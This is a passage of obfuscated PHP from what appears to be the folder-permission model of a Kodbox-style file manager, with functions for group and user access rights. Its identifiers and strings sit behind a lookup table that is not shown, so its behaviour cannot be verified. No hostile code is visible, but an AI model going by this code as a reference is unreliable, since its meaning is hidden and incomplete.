$this->authTargetInfo($ÒÊ³ËŸ¿); $çí„ƒºƒ[$„íó‘…ó[586]] = rtrim($çí„ƒºƒ[$„íó‘…ó[592]], $„íó‘…ó[8]) . $„íó‘…ó[8] . ltrim($çí„ƒºƒ[$„íó‘…ó[586]], $„íó‘…ó[8]); $ÎÖÌğË[] = $çí„ƒºƒ; $Ì‹ôÔ®Á = count(explode($„íó‘…ó[8], trim($çí„ƒºƒ[$„íó‘…ó[586]], $„íó‘…ó[8]))); $Ì®¨Şšì[] = $Ì‹ôÔ®Á + ($çí„ƒºƒ[$„íó‘…ó[33]] == $„íó‘…ó[78] ? 0 : 1000); } array_multisort($Ì®¨Şšì, SORT_ASC, $ÎÖÌğË); return $ÎÖÌğË; } private function groupChidldAllRootSource($ÊŠÚàŞî) { $¦ŞıË¨ =& $_SERVER[™¸œØ®Ü]; $€Íƒ¨ë = Model($¦ŞıË¨[2189])->groupChildrenAll($ÊŠÚàŞî); $º„øæïè = array($¦ŞıË¨[192] => 0, $¦ŞıË¨[573] => array($¦ŞıË¨[7], $€Íƒ¨ë), $¦ŞıË¨[190] => SourceModel::TYPE_GROUP); $š”ÉÁôª = Model($¦ŞıË¨[915])->field($¦ŞıË¨[193])->where($º„øæïè)->select(); $š”ÉÁôª = array_to_keyvalue($š”ÉÁôª, $¦ŞıË¨[12], $¦ŞıË¨[193]); return $š”ÉÁôª; } private function authTargetInfo($¤İ†Â«) { $óıˆûö =& $_SERVER[™¸œØ®Ü]; $ûüğ‰±ó = array(); $¶îƒ•şü = array(); $ô¦˜Ü„¸ = 2 << 25; foreach ($¤İ†Â« as $ÛÏµ‚Ïà) { $£½Æ°Í = Model($óıˆûö[575])->listData($ÛÏµ‚Ïà[$óıˆûö[2104]]); if (!$£½Æ°Í) { continue; } if ($ÛÏµ‚Ïà[$óıˆûö[190]] == SourceModel::TYPE_USER) { $Î…¤İ­ = Model($óıˆûö[581])->getInfoSimpleOuter($ÛÏµ‚Ïà[$óıˆûö[573]]); if ($Î…¤İ­[$óıˆûö[1795]] == $óıˆûö[1292]) { continue; } if ($Î…¤İ­[$óıˆûö[1795]] == $óıˆûö[230]) { $Î…¤İ­[$óıˆûö[32]] = LNG($óıˆûö[2190]); } } else { $Î…¤İ­ = Model($óıˆûö[589])->getInfoSimple($ÛÏµ‚Ïà[$óıˆûö[573]]); } if (!$Î…¤İ­) { continue; } $Î…¤İ­[$óıˆûö[544]] = $£½Æ°Í; $ûüğ‰±ó[] = $Î…¤İ­; $¾¾ì½³ò = 0; if ($ÛÏµ‚Ïà[$óıˆûö[190]] == SourceModel::TYPE_GROUP) { $¾¾ì½³ò = $ô¦˜Ü„¸ * 2; } if ($ÛÏµ‚Ïà[$óıˆûö[190]] == SourceModel::TYPE_USER) { $¾¾ì½³ò = $ô¦˜Ü„¸; } if ($ÛÏµ‚Ïà[$óıˆûö[190]] == SourceModel::TYPE_USER && $ÛÏµ‚Ïà[$óıˆûö[573]] == $óıˆûö[230]) { $¾¾ì½³ò = 0; } $¶îƒ•şü[] = $£½Æ°Í[$óıˆûö[489]] + $¾¾ì½³ò; } array_multisort($¶îƒ•şü, SORT_DESC, $ûüğ‰±ó); return $ûüğ‰±ó; } public function getAllChildrenByUser($¦’Á¬ø¬, $€ê¥Ä©) { $âÁ‰…ù¬ =& $_SERVER[™¸œØ®Ü]; $Ñ„ÑÓŠÌ = Model($âÁ‰…ù¬[601])->getInfo($€ê¥Ä©); if (!$€ê¥Ä© || !$¦’Á¬ø¬ || !$Ñ„ÑÓŠÌ) { return array(); } $‘—©¯¼ = Model($âÁ‰…ù¬[1440])->sourceInfo($¦’Á¬ø¬); $½Ó©ˆÍµ = array(); $¦˜×ªëÖ = 1; if ($‘—©¯¼[$âÁ‰…ù¬[192]] == $âÁ‰…ù¬[230] && $‘—©¯¼[$âÁ‰…ù¬[573]] != $¦˜×ªëÖ && $this->groupContainUser($‘—©¯¼[$âÁ‰…ù¬[573]], $€ê¥Ä©)) { foreach ($Ñ„ÑÓŠÌ[$âÁ‰…ù¬[2191]] as $ÃÁôÂ¼À) { $¾°Ÿ¨’ì = Model($âÁ‰…ù¬[589])->getInfo($ÃÁôÂ¼À[$âÁ‰…ù¬[1996]]); $¬îéİ°ß = Model($âÁ‰…ù¬[601])->getInfoSimpleOuter($€ê¥Ä©); $¬îéİ°ß[$âÁ‰…ù¬[544]] = $ÃÁôÂ¼À[$âÁ‰…ù¬[489]]; if (Model($âÁ‰…ù¬[575])->authCheckAction($ÃÁôÂ¼À[$âÁ‰…ù¬[489]][$âÁ‰…ù¬[489]], $âÁ‰…ù¬[2017])) { continue; } $…íÖüš™ = array($âÁ‰…ù¬[32] => $âÁ‰…ù¬[1312] . $¾°Ÿ¨’ì[$âÁ‰…ù¬[32]], $âÁ‰…ù¬[193] => $¾°Ÿ¨’ì[$âÁ‰…ù¬[90]][$âÁ‰…ù¬[193]], $âÁ‰…ù¬[87] => KodIO::make($¾°Ÿ¨’ì[$âÁ‰…ù¬[90]][$âÁ‰…ù¬[193]]), $âÁ‰…ù¬[192] => $âÁ‰…ù¬[230], $âÁ‰…ù¬[190] => $âÁ‰…ù¬[582], $âÁ‰…ù¬[33] => $âÁ‰…ù¬[623], $âÁ‰…ù¬[586] => $¾°Ÿ¨’ì[$âÁ‰…ù¬[593]], $âÁ‰…ù¬[1996] => $¾°Ÿ¨’ì[$âÁ‰…ù¬[1996]], $âÁ‰…ù¬[590] => $¾°Ÿ¨’ì[$âÁ‰…ù¬[192]], $âÁ‰…ù¬[2188] => array($¬îéİ°ß)); $½Ó©ˆÍµ[$…íÖüš™[$âÁ‰…ù¬[193]]] = $…íÖüš™; } } $Ûš”‚¿ = array(); $Ûè¯á©º = $this->getAllChildren($¦’Á¬ø¬); foreach ($Ûè¯á©º as $ÔÕ„ô²) { $Ë¶Á‚óÀ = !1; foreach ($ÔÕ„ô²[$âÁ‰…ù¬[2188]] as $áã³Í“Ã) { if ($áã³Í“Ã[$âÁ‰…ù¬[1795]]) { if ($áã³Í“Ã[$âÁ‰…ù¬[1795]] == $€ê¥Ä©) { $Ë¶Á‚óÀ = !0; break; } } if ($áã³Í“Ã[$âÁ‰…ù¬[1996]]) { if ($this->groupContainUser($áã³Í“Ã[$âÁ‰…ù¬[1996]], $€ê¥Ä©)) { $Ë¶Á‚óÀ = !0; break; } } } if ($Ë¶Á‚óÀ) { $Ûš”‚¿[] = $ÔÕ„ô²; } $üò¨Ş¥ˆ = $ÔÕ„ô²[$âÁ‰…ù¬[193]]; if (isset($½Ó©ˆÍµ[$üò¨Ş¥ˆ])) { $ÔÕ„ô²[$âÁ‰…ù¬[2188]][] = $½Ó©ˆÍµ[$üò¨Ş¥ˆ][0]; $½Ó©ˆÍµ[$üò¨Ş¥ˆ] = !1; } } $½Ó©ˆÍµ = array_filter(array_values($½Ó©ˆÍµ)); $Ûš”‚¿ = array_merge($½Ó©ˆÍµ, $Ûš”‚¿); return $Ûš”‚¿; } public function setAllChildrenByUser($ã€Ä¦Õü, $‹•„·ƒ, $­ôŠ†ç½) { $öÕ›Šƒ’ =& $_SERVER[™¸œØ®Ü]; $°æê‡¢ = $this->getAllChildrenByUser($ã€Ä¦Õü, $‹•„·ƒ); if (!$­ôŠ†ç½ || !$°æê‡¢) { return !1; } foreach ($°æê‡¢ as $»¹¢Ñ¼“) { $øí¤‡ù² = array(); foreach ($»¹¢Ñ¼“[$öÕ›Šƒ’[2188]] as $˜ë£ĞëË) { $Úûú¯®– = $˜ë£ĞëË[$öÕ›Šƒ’[544]]; $Ù¡¶»¬’ = $˜ë£ĞëË[$öÕ›Šƒ’[1795]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ƒ«…Šº« = $˜ë£ĞëË[$öÕ›Šƒ’[1795]] ? $˜ë£ĞëË[$öÕ›Šƒ’[1795]] : $˜ë£ĞëË[$öÕ›Šƒ’[1996]]; if ($˜ë£ĞëË[$öÕ›Šƒ’[1795]] && $˜ë£ĞëË[$öÕ›Šƒ’[1795]] == $‹•„·ƒ) { continue; } $øí¤‡ù²[] = array($öÕ›Šƒ’[193] => $»¹¢Ñ¼“[$öÕ›Šƒ’[193]], $öÕ›Šƒ’[190] => $Ù¡¶»¬’, $öÕ›Šƒ’[573] => intval($ƒ«…Šº«), $öÕ›Šƒ’[2104] => isset($Úûú¯®–[$öÕ›Šƒ’[477]]) ? intval($Úûú¯®–[$öÕ›Šƒ’[477]]) : 0, $öÕ›Šƒ’[2168] => isset($Úûú¯®–[$öÕ›Šƒ’[2168]]) ? intval($Úûú¯®–[$öÕ›Šƒ’[2168]]) : -1); } $øí¤‡ù²[] = array($öÕ›Šƒ’[193] => $»¹¢Ñ¼“[$öÕ›Šƒ’[193]], $öÕ›Šƒ’[190] => SourceModel::TYPE_USER, $öÕ›Šƒ’[573] => intval($‹•„·ƒ), $öÕ›Šƒ’[2104] => intval($­ôŠ†ç½), $öÕ›Šƒ’[2168] => -1); $this->where(array($öÕ›Šƒ’[493] => $»¹¢Ñ¼“[$öÕ›Šƒ’[193]]))->delete(); $this->addAll($øí¤‡ù²); } return !0; } public function get($€öŸ»’) { $ùûÉ¿ÔÆ = $this->getSourceList(array($€öŸ»’), !0); return $ùûÉ¿ÔÆ[0]; } public function getSourceList($¯Á¤×Èæ, $šœ—ÖÇŒ = false, $ÏÑŠúŠŒ = false) { $ÑÅøÀ® =& $_SERVER[™¸œØ®Ü]; if (!$¯Á¤×Èæ) { return array(); } $­Ì·¡öƒ = Model($ÑÅøÀ®[1440]); if (!$šœ—ÖÇŒ && count($¯Á¤×Èæ) == 1) { $šœ—ÖÇŒ = array(); $šœ—ÖÇŒ[$¯Á¤×Èæ[0]] = $­Ì·¡öƒ->sourceInfo($¯Á¤×Èæ[0]); } if (!$šœ—ÖÇŒ) { $°¾Ë’Øæ = array($ÑÅøÀ®[493] => array($ÑÅøÀ®[494], $¯Á¤×Èæ)); $šœ—ÖÇŒ = $­Ì·¡öƒ->field($ÑÅøÀ®[2192])->where($°¾Ë’Øæ)->select(); $šœ—ÖÇŒ = array_to_keyvalue($šœ—ÖÇŒ, $ÑÅøÀ®[193]); } $Æ•‹ï = $¯Á¤×Èæ; foreach ($šœ—ÖÇŒ as $ıÍîÄ => $œ¿òåœ¶) { $ÜÓ­ß× = $­Ì·¡öƒ->parentLevelArray($œ¿òåœ¶[$ÑÅøÀ®[588]]); $Æ•‹ï = array_merge($Æ•‹ï, array($ıÍîÄ), array_reverse($ÜÓ­ß×)); } $Æ•‹ï = array_values(array_unique($Æ•‹ï)); if (!$Æ•‹ï) { return array(); } $ğÙˆïş = $this->sourceAuthSelect($Æ•‹ï); $·´²¿¬œ = array(); foreach ($Æ•‹ï as $¨‰åüÁ) { if (isset($ğÙˆïş[$¨‰åüÁ])) { $·´²¿¬œ[$¨‰åüÁ] = $ğÙˆïş[$¨‰åüÁ]; } } $’§ä¯¿‰ = $this->userIsRoot($ÏÑŠúŠŒ); $¸€Äøöâ = AuthModel::authAll(); $Ñõé…÷¬ = array($ÑÅøÀ®[490] => $¸€Äøöâ, $ÑÅøÀ®[2193] => array($ÑÅøÀ®[495] => 0, $ÑÅøÀ®[2002] => $¸€Äøöâ, $ÑÅøÀ®[496] => LNG($ÑÅøÀ®[2194]), $ÑÅøÀ®[2019] => $ÑÅøÀ®[2195])); $“÷õõ»Æ = array(); foreach ($šœ—ÖÇŒ as $¨‰åüÁ => $ü‚ŸÕ¶) { if ($’§ä¯¿‰ && $GLOBALS[$ÑÅøÀ®[6]][$ÑÅøÀ®[2015]]) { $“÷õõ»Æ[$¨‰åüÁ] = $Ñõé…÷¬; continue; } $“÷õõ»Æ[$¨‰åüÁ] = $this->makeSourceAuth($ü‚ŸÕ¶, $·´²¿¬œ, $ÏÑŠúŠŒ); } return $“÷õõ»Æ; } public function authDeepCheck($İì‡Í, $÷ã‡Ş = false) { $•Óó—å¦ =& $_SERVER[™¸œØ®Ü]; $÷ã‡Ş = $÷ã‡Ş ? $÷ã‡Ş : USER_ID; $èø®‰Ûô = $this->makeAuthDeep($÷ã‡Ş); if (!in_array($İì‡Í, $èø®‰Ûô[$•Óó—å¦[2196]])) { return !1; } $Ÿ®í€‘œ = array(); foreach ($èø®‰Ûô[$•Óó—å¦[2197]] as $çÈèŞÌ => $÷’»Æ­) { if (!in_array($İì‡Í, $÷’»Æ­)) { continue; } $Ÿ®í€‘œ[] = $çÈèŞÌ; } if (!$Ÿ®í€‘œ) { return !1; } $ğ–‰ Úü = $Ÿ®í€‘œ ? $Ÿ®í€‘œ[0] : $İì‡Í; return array($•Óó—å¦[490] => -1, $•Óó—å¦[544] => array($•Óó—å¦[495] => $•Óó—å¦[1292], $•Óó—å¦[2002] => $•Óó—å¦[230], $•Óó—å¦[496] => LNG($•Óó—å¦[2198]), $•Óó—å¦[2019] => $•Óó—å¦[2199]), $•Óó—å¦[2200] => LNG($•Óó—å¦[2201]), $•Óó—å¦[2202] => $this->sourceAuthInfo($ğ–‰ Úü)); } protected function makeAuthDeep($¿®¡Ò™š = false) { $üôŠìëŞ =& $_SERVER[™¸œØ®Ü]; static $šÙºàè‡ = array(); $¿®¡Ò™š = $¿®¡Ò™š ? $¿®¡Ò™š : USER_ID; if (isset($šÙºàè‡[$¿®¡Ò™š])) { return $šÙºàè‡[$¿®¡Ò™š]; } $¬ ÅŒ½¸ = Model($üôŠìëŞ[2203])->listData(); $£¦æÃÄ = array(); foreach ($¬ ÅŒ½¸ as $¿šÀæù) { if ($¿šÀæù[$üôŠìëŞ[489]] == 0 && $¿šÀæù[$üôŠìëŞ[2018]] == $üôŠìëŞ[91]) { $£¦æÃÄ[] = $¿šÀæù[$üôŠìëŞ[477]]; } } $ÅÍúáÊ = $this->userGroupParents($¿®¡Ò™š); $õôÜºÁÛ = array($üôŠìëŞ[190] => SourceModel::TYPE_USER, $üôŠìëŞ[573] => $¿®¡Ò™š); if ($ÅÍúáÊ) { $õôÜºÁÛ = array(array($üôŠìëŞ[190] => SourceModel::TYPE_USER, $üôŠìëŞ[573] => $¿®¡Ò™š), array($üôŠìëŞ[190] => SourceModel::TYPE_GROUP, $üôŠìëŞ[573] => array($üôŠìëŞ[494], $ÅÍúáÊ)), $üôŠìëŞ[1096] => $üôŠìëŞ[2098]); } $ĞÜŠ¿Æ° = $this->field($üôŠìëŞ[2204])->where($õôÜºÁÛ)->select(); $¹³Òµü¢ = array(); $­§«‡Ó = array_to_keyvalue_group($ĞÜŠ¿Æ°, $üôŠìëŞ[193]); foreach ($­§«‡Ó as $³–œ”¤ => $ñÈÆûó¥) { $†Ÿ¾×©¯ = $this->authArrayCheck($ñÈÆûó¥, $¿®¡Ò™š); if ($†Ÿ¾×©¯[$üôŠìëŞ[490]] > 0) { $¹³Òµü¢[] = $³–œ”¤ . $üôŠìëŞ[12]; } } if ($ÅÍúáÊ) { $ôÖ‰É€ = Model($üôŠìëŞ[589]); foreach ($ÅÍúáÊ as $Ààå°¡³) { $•‰ê¹Ğ = $ôÖ‰É€->getInfo($Ààå°¡³); if (!$•‰ê¹Ğ || !is_array($•‰ê¹Ğ[$üôŠìëŞ[90]])) { continue; } $¹³Òµü¢[] = $•‰ê¹Ğ[$üôŠìëŞ[90]][$üôŠìëŞ[193]]; } } $àéæ„ğ = array(); $œ¢ô‰ˆ… = $ÅÍúáÊ; $¿’ö½ç = Model($üôŠìëŞ[1440]); $ôÖ‰É€ = Model($üôŠìëŞ[589]); $é•ñ’ñ« = array(); $×¹¼¥ÊÆ = array(); $˜¿…¯ò = array(); $ÇëãÁ»Ü = array(); if ($¹³Òµü¢) { $¼’Óœ¦ê = $¿’ö½ç->where(array($üôŠìëŞ[193] => array($üôŠìëŞ[494], $¹³Òµü¢)))->select(); foreach ($¼’Óœ¦ê as $ô¾¾ÂåŠ) { if ($ô¾¾ÂåŠ[$üôŠìëŞ[507]] == $üôŠìëŞ[91]) { continue; } $Ï‚İ‰†ü = $¿’ö½ç->parentLevelArray($ô¾¾ÂåŠ[$üôŠìëŞ[588]]); $àéæ„ğ = array_merge($àéæ„ğ, $Ï‚İ‰†ü); $œ¢ô‰ˆ…[] = $ô¾¾ÂåŠ[$üôŠìëŞ[573]]; $é•ñ’ñ«[$ô¾¾ÂåŠ[$üôŠìëŞ[193]]] = $Ï‚İ‰†ü; $×¹¼¥ÊÆ[$ô¾¾ÂåŠ[$üôŠìëŞ[193]]] = $ô¾¾ÂåŠ[$üôŠìëŞ[573]]; } } $œ¢ô‰ˆ… = array_values(array_unique($œ¢ô‰ˆ…)); $±ŸÚÚ‰ = $œ¢ô‰ˆ…; foreach ($±ŸÚÚ‰ as $Ààå°¡³) { $•‰ê¹Ğ = $ôÖ‰É€->getInfo($Ààå°¡³); $Ï‚İ‰†ü = $¿’ö½ç->parentLevelArray($•‰ê¹Ğ[$üôŠìëŞ[588]]); $œ¢ô‰ˆ… = array_merge($œ¢ô‰ˆ…, $Ï‚İ‰†ü); } $œ¢ô‰ˆ… = array_values(array_unique($œ¢ô‰ˆ…)); foreach ($œ¢ô‰ˆ… as $Ààå°¡³) { $•‰ê¹Ğ = $ôÖ‰É€->getInfo($Ààå°¡³); $àéæ„ğ[] = $•‰ê¹Ğ[$üôŠìëŞ[90]][$üôŠìëŞ[193]]; $˜¿…¯ò[$Ààå°¡³] = $•‰ê¹Ğ[$üôŠìëŞ[90]][$üôŠìëŞ[193]]; $ÇëãÁ»Ü[$Ààå°¡³] = $¿’ö½ç->parentLevelArray($•‰ê¹Ğ[$üôŠìëŞ[588]]); } foreach ($é•ñ’ñ« as $§½­­¢ë => $§²¡ú€´) { $¸Ò¯ó–» = $×¹¼¥ÊÆ[$§½­­¢ë]; if (!$¸Ò¯ó–» || !$˜¿…¯ò[$¸Ò¯ó–»]) { continue; } $ƒ°íğŞœ = array(); foreach ($ÇëãÁ»Ü[$¸Ò¯ó–»] as $Ààå°¡³) { $ƒ°íğŞœ[] = $˜¿…¯ò[$Ààå°¡³]; } $é•ñ’ñ«[$§½­­¢ë] = array_merge($ƒ°íğŞœ, $§²¡ú€´); } $àéæ„ğ = array_values(array_unique($àéæ„ğ)); $áƒ¬§ú‡ = array($üôŠìëŞ[2196] => $àéæ„ğ, $üôŠìëŞ[2197] => $é•ñ’ñ«); $šÙºàè‡[$¿®¡Ò™š] = $áƒ¬§ú‡; return $áƒ¬§ú‡; } private function makeSourceAuth($º•¹öŞ, $ÕæÃõåö, $€àèßş• = false) { $âŸ¹Áª“ =& $_SERVER[™¸œØ®Ü]; $¯ÜÅ•¯ƒ = $âŸ¹Áª“[91]; $Á¶“ê¥Ö = $º•¹öŞ[$âŸ¹Áª“[573]]; $¤Ëı¯È = $º•¹öŞ[$âŸ¹Áª“[190]] == SourceModel::TYPE_GROUP; $ĞÎ±À = $¤Ëı¯È ? $this->groupRootAuth($Á¶“ê¥Ö, $€àèßş•) : !1; if ($ĞÎ±À && Model($âŸ¹Áª“[575])->authCheckAction($ĞÎ±À[$âŸ¹Áª“[489]], $âŸ¹Áª“[2017])) { return $this->groupAuthInfo($ĞÎ±À, $Á¶“ê¥Ö); } $¦¸Šœù = Model($âŸ¹Áª“[1440])->parentLevelArray($º•¹öŞ[$âŸ¹Áª“[588]]); $¦¸Šœù = array_merge(array($º•¹öŞ[$âŸ¹Áª“[193]]), array_reverse($¦¸Šœù)); $Åôñ§ˆ– = !1; foreach ($¦¸Šœù as $Şï®×´) { if (!isset($ÕæÃõåö[$Şï®×´])) { continue; } $Æ‘ó¡æ¨ = $this->authMake($ÕæÃõåö[$Şï®×´], $€àèßş•); if ($Æ‘ó¡æ¨[$âŸ¹Áª“[544]]) { $Åôñ§ˆ– = $Æ‘ó¡æ¨; break; } } if (!$¤Ëı¯È) { return $Åôñ§ˆ–; } if (!$Åôñ§ˆ– && $ĞÎ±À) { $Åôñ§ˆ– = $this->groupAuthInfo($ĞÎ±À, $Á¶“ê¥Ö); } if (!$Åôñ§ˆ–) { $Éè–Œ’ª = Model($âŸ¹Áª“[589])->getInfo($Á¶“ê¥Ö); $‘·ùçâ° = explode($âŸ¹Áª“[50], trim($Éè–Œ’ª[$âŸ¹Áª“[588]], $âŸ¹Áª“[50])); $‘·ùçâ° = array_reverse($‘·ùçâ°); foreach ($‘·ùçâ° as $¯„ˆÏ±Ë) { if ($¯„ˆÏ±Ë == $âŸ¹Áª“[230] || $¯„ˆÏ±Ë == $¯ÜÅ•¯ƒ) { continue; } $ıòãë£å = $this->groupRootAuth($¯„ˆÏ±Ë, $€àèßş•); if (!$ıòãë£å) { continue; } $Åôñ§ˆ– = $this->groupAuthInfo($ıòãë£å, $¯„ˆÏ±Ë); break; } } if (!$Åôñ§ˆ– || $Åôñ§ˆ–[$âŸ¹Áª“[490]] <= 0) { $Úì¹ÒÑ = $this->authDeepCheck($º•¹öŞ[$âŸ¹Áª“[193]], $€àèßş•); if ($Úì¹ÒÑ) { $Åôñ§ˆ– = $Úì¹ÒÑ; } } return $Åôñ§ˆ–; } private function userIsRoot($Ê´é‡ı© = false) { $‹Ø§·Áû =& $_SERVER[™¸œØ®Ü]; if (!$Ê´é‡ı© && KodUser::isRoot()) { return !0; } $©çÊ¬Ñ = Model($‹Ø§·Áû[601])->getInfo($Ê´é‡ı©); $¹Ïı·°¯ = Model($‹Ø§·Áû[2205])->listData($©çÊ¬Ñ[$‹Ø§·Áû[2206]]); if ($¹Ïı·°¯ && $¹Ïı·°¯[$‹Ø§·Áû[579]][$‹Ø§·Áû[2207]] == 1) { return !0; } return !1; } private function sourceAuthInfo($äÅŠ¥—±) { $Î¦¯í×Î =& $_SERVER[™¸œØ®Ü]; $¹©¥ƒêÊ = Model($Î¦¯í×Î[1440]); $±…ú¥ƒ = $¹©¥ƒêÊ->sourceInfo($äÅŠ¥—±); if (!$±…ú¥ƒ) { return !1; } $¹©¥ƒêÊ->groupPathDisplay($±…ú¥ƒ); $¡Ä¨‚¸Ï = array($±…ú¥ƒ); $¡Ä¨‚¸Ï = $¹©¥ƒêÊ->_listAppendPath($¡Ä¨‚¸Ï); $±…ú¥ƒ = $¡Ä¨‚¸Ï[0]; $§¤×¢Êö = $±…ú¥ƒ[$Î¦¯í×Î[586]]; if (isset($±…ú¥ƒ[$Î¦¯í×Î[594]])) { $”æïáè• = explode($Î¦¯í×Î[8], trim($±…ú¥ƒ[$Î¦¯í×Î[586]], $Î¦¯í×Î[8])); array_shift($”æïáè•); $§¤×¢Êö = $±…ú¥ƒ[$Î¦¯í×Î[592]] . $Î¦¯í×Î[2208] . implode($Î¦¯í×Î[8], $”æïáè•); } return array($Î¦¯í×Î[496] => $±…ú¥ƒ[$Î¦¯í×Î[32]], $Î¦¯í×Î[87] => KodIO::make($±…ú¥ƒ[$Î¦¯í×Î[193]]), $Î¦¯í×Î[2209] => $§¤×¢Êö); } private function groupAuthInfo($”Öï€¦©, $…Œ»¢È¸) { $±£ùÃıÙ =& $_SERVER[™¸œØ®Ü]; $µÂ“ÜÓ = Model($±£ùÃıÙ[589])->getInfo($…Œ»¢È¸); return array($±£ùÃıÙ[2210] => intval($”Öï€¦©[$±£ùÃıÙ[489]]), $±£ùÃıÙ[2193] => $”Öï€¦©, $±£ùÃıÙ[2211] => LNG($±£ùÃıÙ[2212]), $±£ùÃıÙ[2202] => array($±£ùÃıÙ[496] => $µÂ“ÜÓ[$±£ùÃıÙ[32]], $±£ùÃıÙ[87] => KodIO::make($µÂ“ÜÓ[$±£ùÃıÙ[90]][$±£ùÃıÙ[193]]), $±£ùÃıÙ[2209] => $µÂ“ÜÓ[$±£ùÃıÙ[593]])); } protected function groupRootAuth($üœÆÑÈÂ, $Ë³»é = false) { $‹Åæô‹É =& $_SERVER[™¸œØ®Ü]; $Ë³»é = $Ë³»é ? $Ë³»é : USER_ID; $Ü“›ï‚ = $Ë³»é . $‹Åæô‹É[2213] . $üœÆÑÈÂ; static $Ïºßô€» = array(); if (isset($Ïºßô€»[$Ü“›ï‚])) { return $Ïºßô€»[$Ü“›ï‚]; } $ŒæÛ‘ïş = Model($‹Åæô‹É[589])->getInfo($üœÆÑÈÂ); $ßé‚¥¤ = $this->userGroupList($Ë³»é); $áÇáùÛé = isset($ßé‚¥¤[$üœÆÑÈÂ]) ? $ßé‚¥¤[$üœÆÑÈÂ][$‹Åæô‹É[489]] : !1; if ($áÇáùÛé && Model($‹Åæô‹É[575])->authCheckAction($áÇáùÛé[$‹Åæô‹É[489]], $‹Åæô‹É[2017])) { $Ïºßô€»[$Ü“›ï‚] = $áÇáùÛé; return $áÇáùÛé; } $×Óº³“è = $this->sourceAuthSelect($ŒæÛ‘ïş[$‹Åæô‹É[90]][$‹Åæô‹É[193]]); $òœÔº¹ = $×Óº³“è ? $this->authMake($×Óº³“è, $Ë³»é) : !1; $„¿õ—¡Ğ = $òœÔº¹ ? $òœÔº¹[$‹Åæô‹É[544]] : !1; $Ïºßô€»[$Ü“›ï‚] = $„¿õ—¡Ğ ? $„¿õ—¡Ğ : $áÇáùÛé; return $Ïºßô€»[$Ü“›ï‚]; } public function authOwnerApply($Á³®àõ) { $ÓØÍÆœÖ =& $_SERVER[™¸œØ®Ü]; if (empty($Á³®àõ[$ÓØÍÆœÖ[489]]) || isset($Á³®àõ[$ÓØÍÆœÖ[2214]]) && $Á³®àõ[$ÓØÍÆœÖ[2214]]) { return $Á³®àõ; } if (AuthModel::authCheckRoot($Á³®àõ[$ÓØÍÆœÖ[489]][$ÓØÍÆœÖ[490]])) { return $Á³®àõ; } $½…ˆ¬¡” = Model($ÓØÍÆœÖ[1440])->parentLevelArray($Á³®àõ[$ÓØÍÆœÖ[588]]); $½…ˆ¬¡” = array_merge(array($Á³®àõ[$ÓØÍÆœÖ[193]]), array_reverse($½…ˆ¬¡”)); $Ü³Í¼–² = $this->sourceAuthSelect($½…ˆ¬¡”); $™¥³Ù« = array(); $ˆˆ“¨± = array(); foreach ($Ü³Í¼–² as $Ğè¸•Ñ¼ => $¼†’¢Åû) { $·ˆåÉ‘ª = $this->authFolderOwnerUser($¼†’¢Åû); $™¥³Ù«[$Ğè¸•Ñ¼] = $·ˆåÉ‘ª; $ˆˆ“¨± = array_merge($ˆˆ“¨±, $·ˆåÉ‘ª[$ÓØÍÆœÖ[669]]); if ($·ˆåÉ‘ª[$ÓØÍÆœÖ[2215]]) { break; } } if (count($ˆˆ“¨±) == 0) { $ˆˆ“¨± = $this->authFolderOwnerGroup($Á³®àõ[$ÓØÍÆœÖ[573]]); } $ˆˆ“¨± = array_unique($ˆˆ“¨±); if (AuthModel::authCheckRoot($Á³®àõ[$ÓØÍÆœÖ[489]][$ÓØÍÆœÖ[490]])) { $ˆˆ“¨±[] = USER_ID; } $Á³®àõ[$ÓØÍÆœÖ[489]][$ÓØÍÆœÖ[2216]] = Model($ÓØÍÆœÖ[581])->userListInfo($ˆˆ“¨±); return $Á³®àõ; } private function authFolderOwnerGroup($à™«¾İ¬) { $Æş¤¯Ú¯ =& $_SERVER[™¸œØ®Ü]; $×³²óåØ = Model($Æş¤¯Ú¯[2090])->where(array($Æş¤¯Ú¯[1996] => $à™«¾İ¬))->select(); $„”ô„ç¢ = array(); if (!$×³²óåØ) { return $„”ô„ç¢; } foreach ($×³²óåØ as $•ñáÃø¾) { $Î¬¾µÁæ = $this->authInfo($•ñáÃø¾); if (AuthModel::authCheckRoot($Î¬¾µÁæ[$Æş¤¯Ú¯[489]])) { $„”ô„ç¢[] = $•ñáÃø¾[$Æş¤¯Ú¯[1795]]; } } return $„”ô„ç¢; } private function authFolderOwnerUser($²½§‘õ®) { $°Ó¥ã´Ú =& $_SERVER[™¸œØ®Ü]; $û¿–º¥ = array(); $ÄôÓ‡Ä· = !1; foreach ($²½§‘õ® as $Ë¨€§Ì) { $×¥ÆÉÇŸ = $this->authInfo($Ë¨€§Ì); if ($Ë¨€§Ì[$°Ó¥ã´Ú[573]] == $°Ó¥ã´Ú[230]) { $ÄôÓ‡Ä· = !0; } if ($Ë¨€§Ì[$°Ó¥ã´Ú[190]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($×¥ÆÉÇŸ[$°Ó¥ã´Ú[489]])) { $û¿–º¥[] = $Ë¨€§Ì[$°Ó¥ã´Ú[573]]; } } } return array($°Ó¥ã´Ú[669] => $û¿–º¥, $°Ó¥ã´Ú[2215] => $ÄôÓ‡Ä·); } public function authMake($©¥È¥ğÀ, $ÀÃüÂ®õ = false) { $š¿şˆ‰ú =& $_SERVER[™¸œØ®Ü]; $ıÍ°îŞÁ = $this->authArrayCheck($©¥È¥ğÀ, $ÀÃüÂ®õ); if ($ıÍ°îŞÁ[$š¿şˆ‰ú[2217]]) { $ıÍ°îŞÁ[$š¿şˆ‰ú[2217]] = $this->sourceAuthInfo($ıÍ°îŞÁ[$š¿şˆ‰ú[2217]]); } return $ıÍ°îŞÁ; } public function authArrayCheck($½÷ş†î, $ˆÑ¯ã€¼ = false) { $««‹Á ‰ =& $_SERVER[™¸œØ®Ü]; if (!$½÷ş†î) { return array($««‹Á ‰[490] => 0, $««‹Á ‰[544] => !1); } $ˆÑ¯ã€¼ = $ˆÑ¯ã€¼ ? $ˆÑ¯ã€¼ : USER_ID; $õØ‡ˆ·® = 0; $Ù¬áŒ¹ü = 0; $ôâ«®ã = 0; $Æè›ñÛ· = 0; $œ·€¸˜˜ = 0; $Æòúş¸Æ = 0; $üÄ¾Çº¬ = 1000; $ïïı£ÀÒ = 0; $‘ÏãÜ‹‡ = 0; $ş“¿¡ğ = 0; $İûÍÇÔ = 0; $øü—»ÉÅ = array($««‹Á ‰[193] => 0); foreach ($½÷ş†î as $øü—»ÉÅ) { $ùÒøï» = $this->authInfo($øü—»ÉÅ); if (!$ùÒøï») { continue; } 